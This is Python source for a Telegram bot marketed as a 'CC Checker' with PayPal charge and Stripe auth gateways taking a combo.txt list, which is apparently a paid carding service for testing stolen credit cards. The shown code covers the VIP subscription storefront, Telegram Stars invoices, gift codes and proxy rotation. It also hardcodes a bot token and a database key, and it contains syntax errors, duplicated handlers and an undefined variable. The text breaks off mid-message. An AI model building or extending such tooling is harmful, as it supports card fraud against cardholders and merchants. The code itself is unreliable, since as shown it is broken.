import telebot
from telebot import types
from telebot.types import LabeledPrice, InlineKeyboardMarkup, InlineKeyboardButton
import time
import json
import logging
import threading
from datetime import datetime, timedelta
import random
import string
import re
import hmac
import hashlib
import requests

# ==================== PROXY MANAGEMENT ====================

PROXIES_LIST = []
CURRENT_PROXY_INDEX = 0
PROXY_LOCK = threading.Lock()

def load_proxies():
    """Load proxies from proxies.txt file"""
    global PROXIES_LIST
    try:
        with open('proxies.txt', 'r', encoding='utf-8') as f:
            PROXIES_LIST = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        if PROXIES_LIST:
            print(f"✅ Loaded {len(PROXIES_LIST)} proxies")
        else:
            print("⚠️ No proxies found in proxies.txt")
        return PROXIES_LIST
    except FileNotFoundError:
        print("⚠️ proxies.txt not found. Creating empty file.")
        open('proxies.txt', 'w').close()
        return []
    except Exception as e:
        print(f"Error loading proxies: {e}")
        return []

def get_next_proxy():
    """Get next proxy in round-robin fashion"""
    global PROXIES_LIST, CURRENT_PROXY_INDEX
    if not PROXIES_LIST:
        return None
    with PROXY_LOCK:
        if not PROXIES_LIST:
            return None
        proxy = PROXIES_LIST[CURRENT_PROXY_INDEX % len(PROXIES_LIST)]
        CURRENT_PROXY_INDEX += 1
        return {'http': proxy, 'https': proxy}

def get_random_proxy():
    """Get a random proxy from the list"""
    global PROXIES_LIST
    if not PROXIES_LIST:
        return None
    with PROXY_LOCK:
        if not PROXIES_LIST:
            return None
        proxy = random.choice(PROXIES_LIST)
        return {'http': proxy, 'https': proxy}

# تحميل البروكسيات عند بدء التشغيل
load_proxies()
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
bot = telebot.TeleBot("8740209519:AAFiqUv_qmwHmZtPmeKYq2YyAgAfJuLKPfM")
OWNER_ID = 1013384909
admin = '1013384909'
# Force delete any existing webhook to prevent 409 conflict
try:
    bot.delete_webhook()
    print("✅ Webhook deleted successfully")
except Exception as e:
    print(f"⚠️ Error deleting webhook: {e}")
	@bot.message_handler(commands=['test123'])
def test_buttons(message):
    if str(message.from_user.id) != OWNER_ID:
        return
    buttons = get_buttons_from_db('main_menu')
    if buttons:
        bot.reply_to(message, f"✅ Found {len(buttons)} buttons in main_menu")
    else:
        bot.reply_to(message, "❌ No buttons found in main_menu")
    
LOADING_VIDEO_URL = "https://t.me/Mustafa964iq/3"
# ==================== SUPABASE CONNECTION ====================
from supabase import create_client, Client

SUPABASE_URL = "https://jrmdopbgmiwuhijklwuf.supabase.co"   # رابط مشروعك (موجود في الـ Dashboard)

# استخدم الـ Publishable Key (اللي تبدا بـ sb_publish...)
SUPABASE_KEY = "sb_publishable_vPJ5q9bxJLRlZSOjwgejIQ_9YJ9Muri"  # 👈 غيرها إلى المفتاح اللي عندك

supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
payment_lock = threading.Lock()
last_check_time = int(time.time() * 1000)
processed_transactions = {}
STARS_PLANS = {
    "3h": {"price": 20, "hours": 1, "display": "1 Hours", "display_ar": "١ ساعه"},
    "1d": {"price": 100, "hours": 24, "display": "1 Day", "display_ar": "يوم واحد"},
    #"1w": {"price": 1100, "hours": 168, "display": "1 Week", "display_ar": "أسبوع واحد"},
    #"30d": {"price": 5000, "hours": 720, "display": "1 Month", "display_ar": "شهر واحد"}
}
regmsg = "⚠️ Please register using /register command before using other commands."
notmsg = "⚠️ Sorry This Chat Not Active."
susmsg = "🌩 Sorry, this account is already registered"
clcmsg = "You have been registered successfully ✅."
noamsg = "⚠ Sorry This Commands Vip \nPlease Messaging Admin"
user_counter = 0
user_counter_lock = threading.Lock()
def load_users():
    """Load user data from JSON file"""
    try:
        with open('users.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            global user_counter
            user_counter = data.get('user_counter', 0)
            return data.get('users', {})
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_users(users):
    """Save user data to JSON file"""
    with open('users.json', 'w', encoding='utf-8') as f:
        json.dump({'users': users, 'user_counter': user_counter}, f, indent=4, ensure_ascii=False)

def is_user_registered(user_id):
    """Check if user is registered"""
    try:
        with open('users.txt', 'r', encoding='utf-8') as f:
            for line in f:
                if str(user_id) in line:
                    return True
        return False
    except FileNotFoundError:
        return False

def register_user_in_txt(user):
    """Register user in users.txt file"""
    try:
        with open('users.txt', 'a', encoding='utf-8') as f:
            registration_date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{user.id}&{user.username or 'None'}&Free&0&{registration_date}\n")
        return True
    except Exception as e:
        logger.error(f"Error registering user: {e}")
        return False

def increment_user_counter():
    """Increment user counter"""
    global user_counter
    with user_counter_lock:
        user_counter += 1
        return user_counter

def read_data():
    """Read subscription data"""
    try:
        with open('data.json', 'r') as file:
            return json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def write_data(data):
    """Save subscription data"""
    with open('data.json', 'w') as file:
        json.dump(data, file, indent=4, ensure_ascii=False)

def load_processed_transactions():
    """Load processed transactions from file"""
    global processed_transactions
    try:
        with open('processed_transactions.json', 'r', encoding='utf-8') as f:
            processed_transactions = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        processed_transactions = {}
    return processed_transactions

def save_processed_transactions():
    """Save processed transactions to file"""
    with open('processed_transactions.json', 'w', encoding='utf-8') as f:
        json.dump(processed_transactions, f, indent=4)

def create_vip_code(hours):
    """Create random VIP code"""
    characters = string.ascii_uppercase + string.digits
    code = 'Mustafa-' + ''.join(random.choices(characters, k=4)) + '-' + \
           ''.join(random.choices(characters, k=4)) + '-' + \
           ''.join(random.choices(characters, k=4))

    current_time = datetime.now()
    expiry_time = current_time + timedelta(hours=hours)
    expiry_str = expiry_time.strftime("%Y-%m-%d %H:%M")
    
    return code, expiry_str
# ==================== KEYBOARD CREATION FUNCTIONS ====================

def get_buttons_from_db(menu_name):
    """جلب الأزرار من Supabase لقائمة معينة"""
    try:
        response = supabase.table('bot_buttons')\
            .select('*')\
            .eq('menu_name', menu_name)\
            .eq('is_active', True)\
            .order('sort_order')\
            .execute()
        
        buttons = []
        for btn in response.data:
            button = InlineKeyboardButton(
                text=btn['button_text'],
                callback_data=btn['callback_data'],
                style=btn['button_style']
            )
            if btn.get('emoji_id') and btn['emoji_id']:
                button.icon_custom_emoji_id = btn['emoji_id']
            
            buttons.append(button)
        
        return buttons
    except Exception as e:
        logger.error(f"Error getting buttons from DB: {e}")
        return []
# ==== TEST CODE - DELETE LATER ====
@bot.message_handler(commands=['test_buttons'])
def test_buttons(message):
    if str(message.from_user.id) != OWNER_ID:
        return
    buttons = get_buttons_from_db('main_menu')
    if buttons:
        bot.reply_to(message, f"✅ Found {len(buttons)} buttons in main_menu")
    else:
        bot.reply_to(message, "❌ No buttons found in main_menu")
# ==== END TEST CODE ====
def create_main_menu_keyboard(user_id=None):
    """Create main menu keyboard - dynamic from database"""
    markup = InlineKeyboardMarkup(row_width=2)
    
    # جلب الأزرار من قاعدة البيانات
    buttons = get_buttons_from_db('main_menu')
    
    # توزيع الأزرار في صفوف (2 أزرار بكل صف)
    row = []
    for i, button in enumerate(buttons):
        row.append(button)
        if len(row) == 2 or i == len(buttons) - 1:
            markup.row(*row)
            row = []
    
    return markup

def create_back_button_keyboard():
    """Create keyboard with back button only"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(" 𝐁𝐚𝐜𝐤", callback_data="back", style="danger", icon_custom_emoji_id="5060247798616687432"))
    return markup

def create_back_to_pay_keyboard():
    """Create keyboard to return to Pay section"""
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton(" 𝐁𝐚𝐜𝐤", callback_data="Pay", style="danger", icon_custom_emoji_id="5060247798616687432"))
    return markup

def create_subscription_main_keyboard():
    """Create main subscription keyboard - dynamic from database"""
    markup = InlineKeyboardMarkup(row_width=2)
    
    # جلب الأزرار من قاعدة البيانات
    buttons = get_buttons_from_db('subscription_main')
    
    # توزيع الأزرار في صفوف
    row = []
    for i, button in enumerate(buttons):
        row.append(button)
        if len(row) == 2 or i == len(buttons) - 1:
            markup.row(*row)
            row = []
    
    return markup

def create_binance_plans_keyboard():
    """Create Binance plans keyboard"""
    markup = InlineKeyboardMarkup(row_width=2)
    
    buttons = []
    for plan_key, plan_info in BINANCE_PLANS.items():
        icon = "🥉" if "week" in plan_key else "🥈" if "month" in plan_key else "🥇"
        button_text = f"{icon} {plan_info['display']} - {plan_info['price']}$"
        buttons.append(InlineKeyboardButton(button_text, callback_data=f"binance_{plan_key}", style="primary"))
    
    # Arrange buttons
    for i in range(0, len(buttons), 2):
        if i + 1 < len(buttons):
            markup.row(buttons[i], buttons[i + 1])
        else:
            markup.row(buttons[i])
    
    markup.row(InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐏𝐥𝐚𝐧𝐬", callback_data="subscription_main", style="danger"))
    
    return markup

def create_stars_plans_keyboard():
    """Create Stars plans keyboard"""
    markup = InlineKeyboardMarkup(row_width=2)
    
    buttons = []
    for plan_key, plan_info in STARS_PLANS.items():
        icon = "💫" * (1 if "week" in plan_key else 2 if "month" in plan_key else 1)
        button_text = f"{icon} {plan_info['display']} - {plan_info['price']} ⭐️"
        buttons.append(InlineKeyboardButton(button_text, callback_data=f"stars_{plan_key}", style="primary"))
    
    # Arrange buttons
    for i in range(0, len(buttons), 2):
        if i + 1 < len(buttons):
            markup.row(buttons[i], buttons[i + 1])
        else:
            markup.row(buttons[i])
    
    markup.row(InlineKeyboardButton("🔙 𝐁𝐚𝐜𝐤 𝐓𝐨 𝐏𝐥𝐚𝐧𝐬", callback_data="subscription_main", style="danger"))
    
    return markup

def create_stars_gift_options_keyboard(plan_key):
    """Create Stars payment options keyboard"""
    markup = InlineKeyboardMarkup(row_width=1)
    
    markup.row(
        InlineKeyboardButton("𝐀𝐮𝐭𝐨 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧", callback_data=f"auto_{plan_key}", style="success", icon_custom_emoji_id="5992195984623408246")
    )
    markup.row(
        InlineKeyboardButton("𝐆𝐢𝐟𝐭 𝐂𝐨𝐝𝐞", callback_data=f"gift_{plan_key}", style="success", icon_custom_emoji_id="5060115075537306714")
    )
    markup.row(
        InlineKeyboardButton("𝐁𝐚𝐜𝐤 𝐓𝐨 𝐒𝐭𝐚𝐫𝐬 𝐏𝐥𝐚𝐧𝐬", callback_data="stars_plans", style="danger", icon_custom_emoji_id="5060247798616687432")
    )
     
    return markup

# ==================== MESSAGE HANDLING FUNCTIONS ====================

def send_loading_with_video(chat_id):
    """Send loading message with video"""
    try:
        sent_message = bot.send_video(
            chat_id,
            video=LOADING_VIDEO_URL,
            caption='<blockquote><b><i><a href="t.me/o8380">✦</a> "CC Checker Status: <a href="https://t.me/MustafaChkBot?start=_tgr_pB0JUR8xNDY0">ACTIVE VIP ✓</a>  <a href="t.me/o8380">✦</a>\n━━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="5989984458718056172">📌</tg-emoji> High Class CC Checker with Live Results <tg-emoji emoji-id="5388632425314140043">🔈</tg-emoji>\n\n<tg-emoji emoji-id="5771868281212245617">📢</tg-emoji> Join <a href="t.me/Mustafa964iq">- Mustafa Channel</a> for Free Keys & Updates\n\n- Bot By :> <a href="t.me/o8380">- ✦ Mustafa 964 ✦</a>\n- How To Use The Bot :> <a href="t.me/Mustafa964iq/2">-✦ Click Here For Tutorial ✦</a>"\n 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 -> 𝟔.𝟐</i></b></blockquote>',
            reply_markup=create_main_menu_keyboard(chat_id),
            parse_mode="HTML"
        )
        return sent_message.message_id
    except Exception as e:
        logger.error(f"Error sending video: {e}")
        return None

def edit_message_safe(chat_id, message_id, caption, reply_markup=None, parse_mode=None):
    """Safe message editing function"""
    try:
        bot.edit_message_caption(
            chat_id=chat_id,
            message_id=message_id,
            caption=caption,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
        return True
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" not in str(e):
            logger.error(f"Error editing message: {e}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error editing message: {e}")
        return False

def edit_message_media_safe(chat_id, message_id, media, reply_markup=None):
    """Safe media editing function"""
    try:
        bot.edit_message_media(
            chat_id=chat_id,
            message_id=message_id,
            media=media,
            reply_markup=reply_markup
        )
        return True
    except telebot.apihelper.ApiTelegramException as e:
        if "message is not modified" not in str(e):
            logger.error(f"Error editing media: {e}")
        return False
    except Exception as e:
        logger.error(f"Unexpected error editing media: {e}")
        return False

# ==================== COMMAND HANDLERS ====================

@bot.message_handler(commands=['start'])
def send_main_menu(message):
    """Handle /start command and show main menu"""
    try:
        users = load_users()
        user_id = str(message.from_user.id)

        # Send a welcome video + main menu buttons (fallback to text menu if video fails)
        sent_id = send_loading_with_video(message.chat.id)
        if not sent_id:
            bot.send_message(
                message.chat.id,
                "✨ Welcome! Use the buttons below to navigate.",
                reply_markup=create_main_menu_keyboard(user_id)
            )

        if user_id not in users:
            user_num = increment_user_counter()
            user_info = {
                "id": message.from_user.id,
                "username": message.from_user.username or "",
                "first_name": message.from_user.first_name or "",
                "last_name": message.from_user.last_name or "",
                "registration_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "user_number": user_num
            }
            users[user_id] = user_info
            save_users(users)

    except Exception as e:
        logger.error(f"Error in start command handler: {e}")







@bot.message_handler(commands=['redeem'])
def redeem_code(message):
    """Redeem subscription code"""
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "❌ Use command correctly: /redeem [code]")
            return
        
        code = args[1].strip()
        user_id = str(message.from_user.id)
        
        data = read_data()
        
        if code not in data:
            bot.reply_to(message, "❌ Invalid or expired code")
            return
        
        code_info = data[code]
        expiry_str = code_info.get("time", "")
        
        if expiry_str:
            expiry_date = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M")
            if datetime.now() > expiry_date:
                bot.reply_to(message, "❌ This code has expired")
                del data[code]
                write_data(data)
                return
        
        data[user_id] = {
            "timer": expiry_str,
            "plan": "vip",
            "activated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        
        del data[code]
        write_data(data)
        
        success_msg = f"""
✅ <b>Subscription Activated Successfully!</b>
━━━━━━━━━━━━━━━━━━━
🔑 Code: <code>{code}</code>
📅 Expires: <code>{expiry_str}</code>
━━━━━━━━━━━━━━━━━━━
✨ Enjoy the bot's premium features!
"""
        bot.reply_to(message, success_msg, parse_mode="HTML")
        
        user = message.from_user
        owner_msg = f"""
🆕 <b>New Code Redeemed</b>
━━━━━━━━━━━━━━━━━━━
👤 User: {user.first_name} @{user.username}
🆔 ID: <code>{user.id}</code>
🔑 Code: <code>{code}</code>
📅 Expires: <code>{expiry_str}</code>
━━━━━━━━━━━━━━━━━━━
"""
        bot.send_message(OWNER_ID, owner_msg, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Error in redeem command: {e}")
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== CALLBACK HANDLERS ====================

@bot.callback_query_handler(func=lambda call: call.data == "Pay")
def pay_callback(call):
    """Handle Gateways button"""
    try:
        bot.edit_message_media(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            media=types.InputMediaVideo(
                media=LOADING_VIDEO_URL,
                caption="""<blockquote><b>〈<a href='t.me/o8380'>〄</a>〉 Welcome To Mustafa Checker -» >_\n\n║<a href='t.me/o8380'>㊕</a>║ Total -» 3 <tg-emoji emoji-id='5060117562323370664'>☑️</tg-emoji>\n║<a href='t.me/o8380'>㊡</a>║ On -» 3 <tg-emoji emoji-id='5992195984623408246'>✅</tg-emoji>\n║<a href='t.me/o8380'>㊤</a>║ Off -» 0 <tg-emoji emoji-id='5974342591552952895'>❌</tg-emoji>\n║<a href='t.me/o8380'>㊬</a>║ Maintenance -» 2 <tg-emoji emoji-id='5990160522312421883'>⚠️</tg-emoji>\n\n[<a href='t.me/o8380'>ϟ</a>] Please select an option !</b></blockquote>""",
                parse_mode="HTML"
            ),
            reply_markup=InlineKeyboardMarkup().row(
                InlineKeyboardButton("𝐂𝐡𝐚𝐫𝐠𝐞", callback_data="charge_section", style="success", icon_custom_emoji_id="5060258969826624275"),
                InlineKeyboardButton("𝐀𝐮𝐓𝐡", callback_data="auth_section", style="primary", icon_custom_emoji_id="5992246772611681940")
            ).row(
                InlineKeyboardButton("𝐁𝐚𝐜𝐤", callback_data="back", style="danger", icon_custom_emoji_id="5060247798616687432")
            )
        )
        
    except Exception as e:
        logger.error(f"Error in gateways callback: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "charge_section")
def charge_section_callback(call):
    """Handle Charge section"""
    try:
        bot.edit_message_media(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            media=types.InputMediaVideo(
                media=LOADING_VIDEO_URL,
                caption="""
<blockquote>━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] PayPal Charge 1$ <tg-emoji emoji-id='5956180995924300841'>💵</tg-emoji>
[<a href='t.me/o8380'>ϟ</a>] the Plan - Vip 
[<a href='t.me/o8380'>ϟ</a>] The matter - combo.txt
━━━━━━━━━━━━━━━━━━━</blockquote>
<blockquote>- Bot By :> <a href='t.me/o8380'>- Mustafa 964</a>
━━━━━━━━━━━━━━━━━━━</blockquote>
""",
                parse_mode="HTML"
            ),
            reply_markup=create_back_to_pay_keyboard()
        )
    except Exception as e:
        logger.error(f"Error in charge section callback: {e}")

def create_back_to_pay_keyboard():
    """Helper function to create back button keyboard"""
    keyboard = InlineKeyboardMarkup()
    keyboard.add(InlineKeyboardButton("Back", callback_data="Pay", style="danger", icon_custom_emoji_id="5060247798616687432"))
    return keyboard

@bot.callback_query_handler(func=lambda call: call.data == "auth_section")
def auth_section_callback(call):
    """Handle Auth section"""
    try:
        bot.edit_message_media(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            media=types.InputMediaVideo(
                media=LOADING_VIDEO_URL,
                caption="""
<blockquote>━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] Stripe Auth  
[<a href='t.me/o8380'>ϟ</a>] the Plan - Vip 
[<a href='t.me/o8380'>ϟ</a>] The matter - combo.txt
━━━━━━━━━━━━━━━━━━━</blockquote>
<blockquote>- Bot By :> <a href='t.me/o8380'>- Mustafa 964</a>
━━━━━━━━━━━━━━━━━━━</blockquote>
""",
                parse_mode="HTML"
            ),
            reply_markup=create_back_to_pay_keyboard()
        )
    except Exception as e:
        logger.error(f"Error in auth section callback: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "subscription_main")
def subscription_main_callback(call):
    """Main subscription menu"""
    try:
        caption = """
<blockquote><tg-emoji emoji-id='5204242830687494041'>🧾</tg-emoji><b>Buy Subscription</b>
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] Choose your payment method:
━━━━━━━━━━━━━━━━━━━
• <tg-emoji emoji-id='5204242830687494041'>🧾</tg-emoji><b>Binance Pay</b> - Pay with cryptocurrency
• <tg-emoji emoji-id='5053473385355412667'>⭐️</tg-emoji> <b>Telegram Stars</b> - Pay with Telegram Stars
━━━━━━━━━━━━━━━━━━━
- Bot By :> <a href='t.me/o8380'>- Mustafa 964</a>
━━━━━━━━━━━━━━━━━━━</blockquote>
"""
        edit_message_media_safe(
            call.message.chat.id,
            call.message.message_id,
            types.InputMediaVideo(media=LOADING_VIDEO_URL, caption=caption, parse_mode="HTML"),
            reply_markup=create_subscription_main_keyboard()
        )
    except:
        edit_message_safe(
            call.message.chat.id,
            call.message.message_id,
            caption,
            reply_markup=create_subscription_main_keyboard(),
            parse_mode="HTML"
        )

@bot.callback_query_handler(func=lambda call: call.data == "binance_plans")
def binance_plans_callback(call):
    """Show Binance plans"""
    try:
        caption = """
<blockquote><tg-emoji emoji-id='5204242830687494041'>🧾</tg-emoji><b>Binance Payment Plans</b>
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] Choose your plan:
━━━━━━━━━━━━━━━━━━━
• <tg-emoji emoji-id='5989971281758394805'>💬</tg-emoji> 1 Hour - 1.00$
• <tg-emoji emoji-id='5989971281758394805'>💬</tg-emoji> 1 Day - 5.00$
• <tg-emoji emoji-id='5989971281758394805'>💬</tg-emoji> 7 Days - 25.00$
• <tg-emoji emoji-id='5989971281758394805'>💬</tg-emoji> 30 Days - 50.00$
━━━━━━━━━━━━━━━━━━━
- Bot By :> <a href='t.me/o8380'>- Mustafa 964</a>
━━━━━━━━━━━━━━━━━━━</blockquote>
"""
        edit_message_media_safe(
            call.message.chat.id,
            call.message.message_id,
            types.InputMediaVideo(media=LOADING_VIDEO_URL, caption=caption, parse_mode="HTML"),
            reply_markup=create_binance_plans_keyboard()
        )
    except:
        edit_message_safe(
            call.message.chat.id,
            call.message.message_id,
            caption,
            reply_markup=create_binance_plans_keyboard(),
            parse_mode="HTML"
        )

@bot.callback_query_handler(func=lambda call: call.data == "stars_plans")
def stars_plans_callback(call):
    """Show Stars plans"""
    try:
        caption = """
<blockquote><b>Telegram Stars Payment Plans <tg-emoji emoji-id='5053473385355412667'>⭐️</tg-emoji></b>
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] Choose your plan:
━━━━━━━━━━━━━━━━━━━
• <tg-emoji emoji-id='5992184495585889960'>🕐</tg-emoji> 3 Hours - 25 <tg-emoji emoji-id='5053473385355412667'>⭐️</tg-emoji>
• 📅 1 Day - 100 <tg-emoji emoji-id='5053473385355412667'><tg-emoji emoji-id='5053473385355412667'>⭐️</tg-emoji>️</tg-emoji>
• 📆 1 Week - 1100 <tg-emoji emoji-id='5053473385355412667'>⭐️</tg-emoji>
• 🗓️ 1 Month - 5000 <tg-emoji emoji-id='5053473385355412667'>⭐️</tg-emoji>
━━━━━━━━━━━━━━━━━━━
- Bot By :> <a href='t.me/o8380'>- Mustafa 964</a>
━━━━━━━━━━━━━━━━━━━</blockquote>
"""
        edit_message_media_safe(
            call.message.chat.id,
            call.message.message_id,
            types.InputMediaVideo(media=LOADING_VIDEO_URL, caption=caption, parse_mode="HTML"),
            reply_markup=create_stars_plans_keyboard()
        )
    except:
        edit_message_safe(
            call.message.chat.id,
            call.message.message_id,
            caption,
            reply_markup=create_stars_plans_keyboard(),
            parse_mode="HTML"
        )


@bot.callback_query_handler(func=lambda call: call.data.startswith('auto_'))
def process_auto_payment(call):
    """Process auto subscription payment"""
    plan_key = call.data.split('_')[1]
    
    if plan_key not in STARS_PLANS:
        bot.answer_callback_query(call.id, "Error processing plan")
        return
    
    plan_info = STARS_PLANS[plan_key]
    duration = plan_info["display"]
    cost = plan_info["price"]
    hours = plan_info["hours"]
    
    prices = [LabeledPrice(label=f"Auto Subscription for {duration}", amount=cost)]

    unique_id = str(int(time.time()))[-8:]
    start_param = f"auto_{duration.replace(' ', '_').lower()}_{unique_id}"
    
    try:
        bot.send_invoice(
            chat_id=call.message.chat.id,
            title=f"Auto Subscription for {duration}",
            description=f"Pay {cost} Stars for {duration} auto subscription",
            provider_token="",
            currency="XTR",
            prices=prices,
            start_parameter=start_param[:64],
            invoice_payload=f"auto_sub_{duration}_{call.from_user.id}_{hours}",
  
        )
    except Exception as e:
        logger.error(f"Error sending invoice: {e}")
        bot.answer_callback_query(call.id, "❌ Error creating invoice")

@bot.callback_query_handler(func=lambda call: call.data.startswith('gift_'))
def process_gift_payment(call):
    """Process gift code payment"""
    plan_key = call.data.split('_')[1]
    
    if plan_key not in STARS_PLANS:
        bot.answer_callback_query(call.id, "Error processing plan")
        return
    
    plan_info = STARS_PLANS[plan_key]
    duration = plan_info["display"]
    cost = plan_info["price"]
    hours = plan_info["hours"]
    
    prices = [LabeledPrice(label=f"Gift Code for {duration}", amount=cost)]

    unique_id = str(int(time.time()))[-8:]
    start_param = f"gift_{duration.replace(' ', '_').lower()}_{unique_id}"
    
    try:
        bot.send_invoice(
            chat_id=call.message.chat.id,
            title=f"Gift Code for {duration}",
            description=f"Pay {cost} Stars for {duration} gift code",
            provider_token="",
            currency="XTR",
            prices=prices,
            start_parameter=start_param[:64],
            invoice_payload=f"gift_code_{duration}_{call.from_user.id}_{hours}",
        )
    except Exception as e:
        logger.error(f"Error sending invoice: {e}")
        bot.answer_callback_query(call.id, "❌ Error creating invoice")

@bot.pre_checkout_query_handler(func=lambda query: True)
def checkout_handler(pre_checkout_query):
    """Handle pre-checkout query"""
    try:
        bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
    except Exception as e:
        logger.error(f"Error in pre-checkout: {e}")


@bot.callback_query_handler(func=lambda call: call.data == "back")
def back_callback(call):
    """Handle Back button to main menu"""
    caption='<blockquote><b><i><a href="t.me/o8380">✦</a> "CC Checker Status: <a href="https://t.me/MustafaChkBot?start=_tgr_pB0JUR8xNDY0">ACTIVE VIP ✓</a>  <a href="t.me/o8380">✦</a>\n━━━━━━━━━━━━━━━━\n<tg-emoji emoji-id="5989984458718056172">📌</tg-emoji> High Class CC Checker with Live Results <tg-emoji emoji-id="5388632425314140043">🔈</tg-emoji>\n\n<tg-emoji emoji-id="5771868281212245617">📢</tg-emoji> Join <a href="t.me/MustafaNumOne">- Mustafa Channel</a> for Free Keys & Updates\n\n- Bot By :> <a href="t.me/o8380">- ✦ Mustafa 964 ✦</a>\n- How To Use The Bot :> <a href="t.me/channelbotMustafa/2">-✦ Click Here For Tutorial ✦</a>"\n 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 -> 𝟔.𝟐</i></b></blockquote>',
    
    edit_message_safe(
        call.message.chat.id,
        call.message.message_id,
        caption,
        reply_markup=create_main_menu_keyboard(call.from_user.id),
        parse_mode="HTML"
    )

@bot.message_handler(content_types=["successful_payment"])
def successful_payment(message):
    """Handle successful payment"""
    try:
        payload = message.successful_payment.invoice_payload
        user_id = message.from_user.id
        username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
        first_name = message.from_user.first_name or "No Name"
        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        if payload.startswith("auto_sub_"):
            parts = payload.split('_')
            duration = parts[2]
            target_user_id = parts[3] if len(parts) > 3 else message.from_user.id
            hours = int(parts[4]) if len(parts) > 4 else 1
            
            code, expiry_str = create_vip_code(hours)
            
            data = read_data()
            data[code] = {
                "plan": "vip",
                "time": expiry_str
            }
            
            data[str(target_user_id)] = {
                "timer": expiry_str,
                "plan": "vip"
            }
            
            write_data(data)
            
            msg = f'''<b>
<tg-emoji emoji-id='5866251720845168552'>🆕</tg-emoji> Auto Subscription Activated Successfully
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] - Your Subscription Has Been Activated Automatically
[<a href='t.me/o8380'>ϟ</a>] - Status - VIP
[<a href='t.me/o8380'>ϟ</a>] - Expires at - {expiry_str}
[<a href='t.me/o8380'>ϟ</a>] - Mustafa 964 -『@o8380』
[<a href='t.me/o8380'>ϟ</a>] - BOT: @MustafaChkBot <tg-emoji emoji-id='5283232570660634549'>🪙</tg-emoji>
━━━━━━━━━━━━━━━━━━━
</b>'''
            bot.send_message(message.chat.id, msg, parse_mode="HTML")
            
            developer_receipt = f"""<b>
<tg-emoji emoji-id='5866251720845168552'>🆕</tg-emoji> New Subscription Purchase <tg-emoji emoji-id='5463088874550999873'>💫</tg-emoji>
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] User: {first_name}
[<a href='t.me/o8380'>ϟ</a>] Username: {username}
[<a href='t.me/o8380'>ϟ</a>] User ID: <code>{user_id}</code>
[<a href='t.me/o8380'>ϟ</a>] Plan: {duration}
[<a href='t.me/o8380'>ϟ</a>] Expiry: {expiry_str}
[<a href='t.me/o8380'>ϟ</a>] Date: {current_time}
[<a href='t.me/o8380'>ϟ</a>] Type: Auto Subscription
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] BOT: @MustafaChkBot <tg-emoji emoji-id='5283232570660634549'>🪙</tg-emoji>
━━━━━━━━━━━━━━━━━━━
</b>"""
            bot.send_message(OWNER_ID, developer_receipt, parse_mode="HTML")
            
        elif payload.startswith("gift_code_"):
            parts = payload.split('_')
            duration = parts[2]
            buyer_id = parts[3] if len(parts) > 3 else message.from_user.id
            hours = int(parts[4]) if len(parts) > 4 else 1
            
            code, expiry_str = create_vip_code(hours)
            
            data = read_data()
            data[code] = {
                "plan": "vip",
                "time": expiry_str
            }
            write_data(data)
            
            msg = f'''<b>
<tg-emoji emoji-id='5352832391138277690'>🎁</tg-emoji> Gift Code Purchased Successfully
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] - This Is Your Gift Code
You Can Send It as a Gift To Your Friend
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] - Status - VIP
[<a href='t.me/o8380'>ϟ</a>] - Expires at - {expiry_str}
[<a href='t.me/o8380'>ϟ</a>] - Mustafa 964 -『@o8380』
[<a href='t.me/o8380'>ϟ</a>] - Code - <code>{code}</code>	
[<a href='t.me/o8380'>ϟ</a>] - Usage - /redeem [Code]
[<a href='t.me/o8380'>ϟ</a>] - BOT: @MustafaChkBot <tg-emoji emoji-id='5283232570660634549'>🪙</tg-emoji>
━━━━━━━━━━━━━━━━━━━
</b>'''
            bot.send_message(message.chat.id, msg, parse_mode="HTML")
            
            developer_receipt = f"""<b>
<tg-emoji emoji-id='5866251720845168552'>🆕</tg-emoji> New Gift Code Purchase <tg-emoji emoji-id='5463088874550999873'>💫</tg-emoji>
━━━━━━━━━━━━━━━━━━━
[<a href='t.me/o8380'>ϟ</a>] User: {first_name}
